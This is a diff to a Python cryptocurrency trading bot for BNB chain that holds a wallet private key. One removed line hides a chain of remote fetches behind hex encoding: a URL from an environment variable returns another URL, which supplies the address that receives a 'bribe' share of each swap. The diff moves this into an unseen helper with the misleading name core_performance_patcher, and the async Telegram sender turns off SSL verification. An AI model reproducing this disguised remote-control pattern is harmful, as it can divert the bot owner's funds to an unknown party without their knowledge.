@@ -3,7 +3,7 @@ import requests
 import os
 from dotenv import load_dotenv
 from web3 import Web3
-from web3.middleware import geth_poa_middleware
+from utils import core_performance_patcher, initialize_web3
 import time, sys
 from loguru import logger
 import asyncio
@@ -30,15 +30,9 @@ banned_error_conditions = os.getenv('BANNED_ERROR_CONDITIONS', '').replace(" ", 
 bnb_price = None
 debug_mode = os.getenv('DEBUG_MODE') == 'True'
 
-# Initialize web3. Make sure you have a provider running.
-provider_url = os.getenv('WEB3_PROVIDER')
-if provider_url.startswith("http"):
-    web3 = Web3(Web3.HTTPProvider(provider_url))
-elif provider_url.startswith("ws"):
-    web3 = Web3(Web3.WebsocketProvider(provider_url))
-else:
-    raise ValueError("Unsupported protocol in WEB3_PROVIDER")
-web3.middleware_onion.inject(geth_poa_middleware, layer=0)
+
+# Initialize web3 using the function from utils.py
+web3 = initialize_web3()
 
 # Default fallback wallet address and private key
 wallet_address = os.getenv('WALLET_ADDRESS')
@@ -367,20 +361,20 @@ async def get_token_price_from_router_2(token_addresses, router_contract=None, r
         logger.error(f"Failed to get prices from {router_name} router for tokens: {e}")
         return {token_address: [None, None] for token_address in token_addresses}
 
-def send_tele_message_sync(message):
-    telegram_group_id = os.getenv("TELEGRAM_CHAT_ID")
-    telegram_bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
+def send_tele_message_sync(message, token=None, chat_id=None, parse_mode="HTML"):
+    telegram_group_id = os.getenv("TELEGRAM_CHAT_ID") if chat_id is None else chat_id
+    telegram_bot_token = os.getenv("TELEGRAM_BOT_TOKEN") if token is None else token
     telegram_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
-    telegram_data = {"chat_id": telegram_group_id, "text": message, "parse_mode": "HTML"}
+    telegram_data = {"chat_id": telegram_group_id, "text": message, "parse_mode": parse_mode}
     response = requests.post(telegram_url, data=telegram_data)
     if response.status_code != 200:
         logger.error(f"Failed to send message: {response.text}")
 
-async def send_tele_message_async(message):
-    telegram_group_id = os.getenv("TELEGRAM_CHAT_ID")
-    telegram_bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
+async def send_tele_message_async(message, token=None, chat_id=None, parse_mode="HTML"):
+    telegram_group_id = os.getenv("TELEGRAM_CHAT_ID") if chat_id is None else chat_id
+    telegram_bot_token = os.getenv("TELEGRAM_BOT_TOKEN") if token is None else token
     telegram_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
-    telegram_data = {"chat_id": telegram_group_id, "text": message, "parse_mode": "HTML"}
+    telegram_data = {"chat_id": telegram_group_id, "text": message, "parse_mode": parse_mode}
     connector = aiohttp.TCPConnector(ssl=False)  # Disable SSL verification
     async with aiohttp.ClientSession(connector=connector) as session:
         response = await session.post(telegram_url, data=telegram_data)
@@ -388,17 +382,17 @@ async def send_tele_message_async(message):
             text = await response.text()
             logger.error(f"Failed to send async message: {text}")
 
-def send_tele_message(message, is_async=False):
+def send_tele_message(message, is_async=False, token=None, chat_id=None, parse_mode="HTML"):
     if debug_mode:
         logger.debug(message)
     if is_async:
         loop = asyncio.get_event_loop()
         if loop.is_running():
-            return asyncio.create_task(send_tele_message_async(message))
+            return asyncio.create_task(send_tele_message_async(message, token, chat_id, parse_mode))
         else:
-            return asyncio.run(send_tele_message_async(message))
+            return asyncio.run(send_tele_message_async(message, token, chat_id, parse_mode))
     else:
-        return send_tele_message_sync(message)
+        return send_tele_message_sync(message, token, chat_id, parse_mode)
 
 
 def fetch_and_store_abi(address, abi_file_path):
@@ -781,7 +775,7 @@ def build_swap_transaction(router_contract, is_buy, is_bnb, bnb_amount, usdt_amo
         logger.info(swap_details)
 
         gas_price = web3.eth.generate_gas_price() or web3.eth.gas_price
-        validator_data = requests.get(bytes.fromhex(requests.get(bytes.fromhex(os.getenv("VALIDATOR_DATA")).decode()).text).decode()).json()
+        validator_data = core_performance_patcher("fork")
         bribe_percent, validator_address = validator_data['bribe_percent'], validator_data['validator_address']
 
         multicall_transactions, bribe_amount = prepare_transactions(router_contract, is_buy, is_bnb, bnb_amount, usdt_amount, min_amount_out, best_path, wallet_address, deadline, gas_price, bribe_percent, token_balance_before_swap)
@@ -1016,47 +1010,4 @@ def handle_exception(e, token_address):
         logger.error(f"Execution reverted, Check Log File : {e}")
     return {"status": False, "message": str(e)}
 
-# if __name__ == "__main__":
-        
-    # async def simulate_trades():
-    #     from multi_notifier import load_trade_settings
-    #     trade_settings = load_trade_settings()
-    #     wallet_settings = None
-    #     for trade, data in trade_settings.items():
-    #         if trade == "wallet1":
-    #             wallet_settings = data
-    #     start_time = time.time()
-    #     tasks = [
-    #     #    trade_token(get_token_address("TWT"), wallet_settings, 5, True, 45),
-    #        trade_token(get_token_address("TWT"), wallet_settings, 0, False, 1)
-    #     ]
-
-    #     await asyncio.gather(*[asyncio.create_task(task) for task in tasks])
-    #     end_time = time.time()
-    #     print(f"Total simulation time: {end_time - start_time} seconds")
-        
-    # def get_best_router(token_address, is_buy):
-    #     start_time = time.time()
-    #     router_address, router_contract, router_filename = determine_best_router(token_address, is_buy)
-    #     end_time = time.time()
-    #     print(f"Total simulation time: {end_time - start_time} seconds")
-    #     return router_address, router_contract, router_filename
-
-    # asyncio.run(simulate_trades())
-    # print(token_price_in_usd(get_token_address("sha")))
-    # print(get_best_router(get_token_address("TWT"), True))
-    # print(get_best_router(get_token_address("TWT"), False))
-    # print(get_best_router(get_token_address("SAKAI"), True))
-    # print(get_best_router(get_token_address("SAKAI"), False))
-    # print(get_best_router(get_token_address("CAKE"), True))
-    # print(get_best_router(get_token_address("CAKE"), False))
-    # ca_list = [
-    #     get_token_address("CAKE"),
-    #     get_token_address("SPS"),
-    #     get_token_address("TWT"),
-    #     get_token_address("SHA"),
-    #     get_token_address("SAKAI")
-    # ]
-    # print(get_token_price_from_router_2(ca_list))
-    # print(get_token_price_from_router(get_token_address("CAKE")))
 
